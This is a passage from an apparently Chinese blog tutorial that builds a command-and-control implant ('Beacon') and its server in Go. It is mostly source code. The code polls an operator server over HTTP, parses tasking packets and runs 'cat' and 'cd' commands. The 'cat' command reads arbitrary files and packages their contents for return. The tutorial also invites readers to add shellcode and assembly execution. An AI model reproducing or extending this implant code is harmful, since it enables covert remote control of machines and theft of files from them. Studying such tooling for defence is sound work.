p.buffer = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:<span class="number">4</span>])</span><br><span class="line">			p.buffer = p.buffer[<span class="number">4</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="type">uint</span>(binary.BigEndian.Uint32(value))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt64() <span class="type">uint64</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &gt;= <span class="number">8</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.Size() == <span class="number">8</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:p.Size()])</span><br><span class="line">			p.buffer = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:<span class="number">8</span>])</span><br><span class="line">			p.buffer = p.buffer[<span class="number">8</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> binary.BigEndian.Uint64(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseBytes() []<span class="type">byte</span> &#123;</span><br><span class="line">	size := p.ParseInt32()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &lt; size &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		b := p.buffer[:size]</span><br><span class="line">		p.buffer = p.buffer[size:]</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseString() <span class="type">string</span> &#123;</span><br><span class="line">	size := p.ParseInt32()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &lt; size &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		b := p.buffer[:size]</span><br><span class="line">		p.buffer = p.buffer[size:]</span><br><span class="line">		<span class="keyword">return</span> <span class="type">string</span>(bytes.Trim(b, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseString64() <span class="type">string</span> &#123;</span><br><span class="line">	size := p.ParseInt64() <span class="comment">// 读取8字节长度</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &lt; <span class="type">uint</span>(size) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		b := p.buffer[:size]</span><br><span class="line">		p.buffer = p.buffer[size:]</span><br><span class="line">		<span class="keyword">return</span> <span class="type">string</span>(bytes.Trim(b, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>profile/profile.go</code>：补充命令常量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	COMMAND_CAT = <span class="number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>main.go</code> 这不是最终代码，后面还会改很多次，这里主要是写了<strong>任务包解读</strong>的相关代码</p>
<ol>
<li>因为可以发送多个任务包，所以Beacon要用循环处理多个数据包</li>
<li>先确保有4字节可读，才进行下一步</li>
<li>根据<code>0~3</code>字节读取任务包数据，并用这个数据初始taskParser解析器</li>
<li>taskParser.buffer的<code>0~3</code>是taskId，<code>4~7</code>是commandId，<code>8~n</code>是命令参数</li>
<li>紧接着根据commandId进入不同的处理分支，这一步没有写，后面会完成</li>
</ol>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	profile.BeaconProfile, err = profile.LoadConfig()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, profile.BeaconProfile)</span><br><span class="line"></span><br><span class="line">	heartBeat = sysinfo.InitHeartBeat()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, heartBeat)</span><br><span class="line"></span><br><span class="line">	metaData := sysinfo.PackHeartBeat(heartBeat)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		time.Sleep(time.Duration(profile.BeaconProfile.Sleep) * time.Second)</span><br><span class="line">		AssemblyBuff, err := common.HttpGet(metaData)</span><br><span class="line">		<span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			parser := packet.CreateParser(AssemblyBuff)</span><br><span class="line">			<span class="keyword">for</span> parser.Size() &gt; <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> parser.Size() &lt; <span class="number">4</span> &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for length field&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 读取任务包</span></span><br><span class="line">				taskData := parser.ParseBytes()</span><br><span class="line">				taskParser := packet.CreateParser(taskData)</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 解析任务ID和任务数据长度</span></span><br><span class="line">				ok := taskParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">if</span> !ok &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for taskId and commandId&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line">				taskID := taskParser.ParseInt32()</span><br><span class="line">				commandId := taskParser.ParseInt32()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">switch</span> commandId &#123;</span><br><span class="line">				<span class="keyword">case</span> profile.COMMAND_CAT:</span><br><span class="line">					data := taskParser.ParseString()</span><br><span class="line">					fmt.Println(data)</span><br><span class="line">					fmt.Println(<span class="string">&quot;taskID: &quot;</span>, taskID)</span><br><span class="line">					fmt.Println(<span class="string">&quot;Command Id: &quot;</span>, commandId)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里是可以进行测试的，我就不测了。</p>
<h2 id="6-2-任务执行并打包结果"><a href="#6-2-任务执行并打包结果" class="headerlink" title="6.2 任务执行并打包结果"></a>6.2 任务执行并打包结果</h2><p>来到师傅们最熟悉的环节：任务执行。  网上已有大量公开资料与开源项目可供参考，覆盖范围从<strong>基础命令</strong>（ls、cd、mv、pwd、cat、whoami …）到<strong>进阶玩法</strong>（execute-BOF、execute-shellcode、execute-assembly、inline-execute等）五花八门。</p>
<p>为了教学方便，我只实现cd和cat命令，后面的各种进阶玩法就由各位师傅自己去拓展了。</p>
<p><strong>beacon端</strong></p>
<p><code>utils/common/changeCp.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;golang.org/x/text/encoding&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/text/encoding/charmap&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/text/transform&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> codePageMapping = <span class="keyword">map</span>[<span class="type">int</span>]encoding.Encoding&#123;</span><br><span class="line">	<span class="number">037</span>:   charmap.CodePage037,   <span class="comment">// IBM EBCDIC US-Canada</span></span><br><span class="line">	<span class="number">437</span>:   charmap.CodePage437,   <span class="comment">// OEM United States</span></span><br><span class="line">	<span class="number">850</span>:   charmap.CodePage850,   <span class="comment">// Western European (DOS)</span></span><br><span class="line">	<span class="number">852</span>:   charmap.CodePage852,   <span class="comment">// Central European (DOS)</span></span><br><span class="line">	<span class="number">855</span>:   charmap.CodePage855,   <span class="comment">// OEM Cyrillic (primarily Russian)</span></span><br><span class="line">	<span class="number">858</span>:   charmap.CodePage858,   <span class="comment">// OEM Multilingual Latin 1 + Euro</span></span><br><span class="line">	<span class="number">860</span>:   charmap.CodePage860,   <span class="comment">// Portuguese (DOS)</span></span><br><span class="line">	<span class="number">862</span>:   charmap.CodePage862,   <span class="comment">// Hebrew (DOS)</span></span><br><span class="line">	<span class="number">863</span>:   charmap.CodePage863,   <span class="comment">// French Canadian (DOS)</span></span><br><span class="line">	<span class="number">865</span>:   charmap.CodePage865,   <span class="comment">// Nordic (DOS)</span></span><br><span class="line">	<span class="number">866</span>:   charmap.CodePage866,   <span class="comment">// Russian (DOS)</span></span><br><span class="line">	<span class="number">936</span>:   simplifiedchinese.GBK, <span class="comment">// Chinese (GBK)</span></span><br><span class="line">	<span class="number">1047</span>:  charmap.CodePage1047,  <span class="comment">// IBM EBCDIC Latin 1/Open System</span></span><br><span class="line">	<span class="number">1140</span>:  charmap.CodePage1140,  <span class="comment">// IBM EBCDIC US-Canada with Euro</span></span><br><span class="line">	<span class="number">1250</span>:  charmap.Windows1250,   <span class="comment">// Central European (Windows)</span></span><br><span class="line">	<span class="number">1251</span>:  charmap.Windows1251,   <span class="comment">// Cyrillic (Windows)</span></span><br><span class="line">	<span class="number">1252</span>:  charmap.Windows1252,   <span class="comment">// Western European (Windows)</span></span><br><span class="line">	<span class="number">1253</span>:  charmap.Windows1253,   <span class="comment">// Greek (Windows)</span></span><br><span class="line">	<span class="number">1254</span>:  charmap.Windows1254,   <span class="comment">// Turkish (Windows)</span></span><br><span class="line">	<span class="number">1255</span>:  charmap.Windows1255,   <span class="comment">// Hebrew (Windows)</span></span><br><span class="line">	<span class="number">1256</span>:  charmap.Windows1256,   <span class="comment">// Arabic (Windows)</span></span><br><span class="line">	<span class="number">1257</span>:  charmap.Windows1257,   <span class="comment">// Baltic (Windows)</span></span><br><span class="line">	<span class="number">1258</span>:  charmap.Windows1258,   <span class="comment">// Vietnamese (Windows)</span></span><br><span class="line">	<span class="number">20866</span>: charmap.KOI8R,         <span class="comment">// Russian (KOI8-R)</span></span><br><span class="line">	<span class="number">21866</span>: charmap.KOI8U,         <span class="comment">// Ukrainian (KOI8-U)</span></span><br><span class="line">	<span class="number">28591</span>: charmap.ISO8859_1,     <span class="comment">// Western European (ISO 8859-1)</span></span><br><span class="line">	<span class="number">28592</span>: charmap.ISO8859_2,     <span class="comment">// Central European (ISO 8859-2)</span></span><br><span class="line">	<span class="number">28593</span>: charmap.ISO8859_3,     <span class="comment">// Latin 3 (ISO 8859-3)</span></span><br><span class="line">	<span class="number">28594</span>: charmap.ISO8859_4,     <span class="comment">// Baltic (ISO 8859-4)</span></span><br><span class="line">	<span class="number">28595</span>: charmap.ISO8859_5,     <span class="comment">// Cyrillic (ISO 8859-5)</span></span><br><span class="line">	<span class="number">28596</span>: charmap.ISO8859_6,     <span class="comment">// Arabic (ISO 8859-6)</span></span><br><span class="line">	<span class="number">28597</span>: charmap.ISO8859_7,     <span class="comment">// Greek (ISO 8859-7)</span></span><br><span class="line">	<span class="number">28598</span>: charmap.ISO8859_8,     <span class="comment">// Hebrew (ISO 8859-8)</span></span><br><span class="line">	<span class="number">28599</span>: charmap.ISO8859_9,     <span class="comment">// Turkish (ISO 8859-9)</span></span><br><span class="line">	<span class="number">28605</span>: charmap.ISO8859_15,    <span class="comment">// Latin 9 (ISO 8859-15)</span></span><br><span class="line">	<span class="number">65001</span>: encoding.Nop,          <span class="comment">// Unicode (UTF-8)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertCpToUTF8</span><span class="params">(input <span class="type">string</span>, codePage <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	enc, exists := codePageMapping[codePage]</span><br><span class="line">	<span class="keyword">if</span> !exists &#123;</span><br><span class="line">		<span class="keyword">return</span> input</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reader := transform.NewReader(strings.NewReader(input), enc.NewDecoder())</span><br><span class="line">	utf8Text, err := io.ReadAll(reader)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> input</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(utf8Text)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertUTF8toCp</span><span class="params">(input <span class="type">string</span>, codePage <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	enc, exists := codePageMapping[codePage]</span><br><span class="line">	<span class="keyword">if</span> !exists &#123;</span><br><span class="line">		<span class="keyword">return</span> input</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	transform.NewWriter(io.Discard, enc.NewEncoder())</span><br><span class="line">	encodedText, err := io.ReadAll(transform.NewReader(strings.NewReader(input), enc.NewEncoder()))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> input</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(encodedText)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>command/cat.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> command</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;Beacon/utils/common&quot;</span></span><br><span class="line">	<span class="string">&quot;Beacon/utils/packet&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Cat</span><span class="params">(packer *packet.Parser, ACP <span class="type">int</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 解析文件路径</span></span><br><span class="line">	path := common.ConvertCpToUTF8(packer.ParseString(), ACP)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. 读取文件内容</span></span><br><span class="line">	content, err := os.ReadFile(path)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	size := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">	binary.BigEndian.PutUint32(size, <span class="type">uint32</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	content = <span class="built_in">append</span>(size, content...)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 打包返回文件内容</span></span><br><span class="line">	arr := []<span class="keyword">interface</span>&#123;&#125;&#123;path, content&#125;</span><br><span class="line">	packed, err := packet.PackArray(arr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> packed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Server端</strong></p>
<p>因为server还没写cd的任务包，在这里补充</p>
<p><code>handler/beacon/beacon_handler.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> CreateTask(beacon response.BeaconData, command <span class="type">string</span>, args <span class="keyword">map</span>[<span class="type">string</span>]any) (response.TaskData, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       taskData response.TaskData  </span><br><span class="line">       err      <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    taskData = response.TaskData&#123;  </span><br><span class="line">       Type: TYPE_TASK,  </span><br><span class="line">       Sync: <span class="literal">true</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> array []<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> command &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cat&quot;</span>:  </span><br><span class="line">       path, ok := args[<span class="string">&quot;path&quot;</span>].(<span class="type">string</span>)  </span><br><span class="line">       <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">          err = errors.New(<span class="string">&quot;parameter &#x27;path&#x27; must be set&quot;</span>)  </span><br><span class="line">          <span class="keyword">goto</span> RET  </span><br><span class="line">       &#125;  </span><br><span class="line">       array = []<span class="keyword">interface</span>&#123;&#125;&#123;<span class="type">int32</span>(COMMAND_CAT), ConvertUTF8toCp(path, beacon.ACP)&#125;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cd&quot;</span>:  </span><br><span class="line">       path, ok := args[<span class="string">&quot;path&quot;</span>].(<span class="type">string</span>)  </span><br><span class="line">       <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">          err = errors.New(<span class="string">&quot;parameter &#x27;path&#x27; must be set&quot;</span>)  </span><br><span class="line">          <span class="keyword">goto</span> RET  </span><br><span class="line">       &#125;  </span><br><span class="line">       array = []<span class="keyword">interface</span>&#123;&#125;&#123;<span class="type">int32</span>(COMMAND_CD), ConvertUTF8toCp(path, beacon.ACP)&#125;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       err = errors.New(fmt.Sprintf(<span class="string">&quot;Command &#x27;%v&#x27; not found&quot;</span>, command))  </span><br><span class="line">       <span class="keyword">goto</span> RET  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    taskData.Data, err = PackArray(array)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">goto</span> RET  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">RET:  </span><br><span class="line">    <span class="keyword">return</span> taskData, err  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    COMMAND_CAT = <span class="number">1</span>  </span><br><span class="line">    COMMAND_CD  = <span class="number">2</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>Beacon端</strong></p>
<p><code>command/cd.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> command</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;Beacon/utils/common&quot;</span></span><br><span class="line">	<span class="string">&quot;Beacon/utils/packet&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Cd</span><span class="params">(packer *packet.Parser,ACP <span class="type">int</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解析目录路径</span></span><br><span class="line">	path := common.ConvertCpToUTF8(packer.ParseString(), ACP)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// cd</span></span><br><span class="line">	err := os.Chdir(<span class="type">string</span>(path))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前路径</span></span><br><span class="line">	dir, err := os.Getwd()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打包返回当前目录</span></span><br><span class="line">	arr := []<span class="keyword">interface</span>&#123;&#125;&#123;dir&#125;</span><br><span class="line">	packed, err := packet.PackArray(arr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> packed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>profile&#x2F;profile.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	COMMAND_CAT = <span class="number">1</span></span><br><span class="line">	COMMAND_CD = <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>main.go</code> 这并未包含结果返回的相关代码，而是直接将错误和结构输出</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 